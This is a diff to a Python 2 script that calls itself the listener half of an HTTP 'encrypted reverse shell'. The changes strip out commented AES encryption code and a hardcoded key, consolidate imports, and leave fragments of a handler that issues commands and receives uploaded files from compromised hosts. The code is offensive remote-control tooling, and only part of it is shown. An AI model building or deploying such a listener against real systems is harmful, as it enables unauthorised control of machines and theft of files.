@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-#   Author = j0lly@anche.no
+#   Author = j0lly
 #   BSD License
 #
 #   this code is an enanchment of an http encrypted reverse python shell and listener from:
@@ -13,34 +13,8 @@
 #        Xavier Garcia http://www.shellguardians.com
 #
 
-from BaseHTTPServer import BaseHTTPRequestHandler
-from BaseHTTPServer import HTTPServer
-import urlparse
-import re
-import os
-import base64
-import binascii
-import tempfile
-
-## the block size for the cipher object; must be 16, 24, or 32 for AES
-#BLOCK_SIZE = 32
-## the character used for padding--with a block cipher such as AES, the value
-## you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
-## used to ensure that your value is always a multiple of BLOCK_SIZE
-#PADDING = '{'
-## one-liner to sufficiently pad the text to be encrypted
-#pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
-#
-## one-liners to encrypt/encode and decrypt/decode a string
-## encrypt with AES, encode with base64
-#EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-#DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-#
-## 32 character secret key - change this if you want to be unique
-#secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
-#
-## create a cipher object using the random secret
-#cipher = AES.new(secret)
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import urlparse, re, os, base64, binascii, tempfile
 
 # url decode for postbacks
 def htc(m):
@@ -87,8 +61,6 @@ class GetHandler(BaseHTTPRequestHandler):
         	self.send_response(200)
 		# end headers
         	self.end_headers()
-#		# encrypt the message
-#		message = EncodeAES(cipher, message)
                 if message[0:6] == "upload" :
                     message = "upload %s" % self.upload_file(message[7:])
 		# base64 it
@@ -133,8 +105,6 @@ class GetHandler(BaseHTTPRequestHandler):
                         print "Error uploading file"
                     else :
                         print "File uploaded to %s" % binascii.unhexlify(message)
-#		# decrypt the string
-#		message = DecodeAES(cipher, message)
 
 if __name__ == '__main__':
 
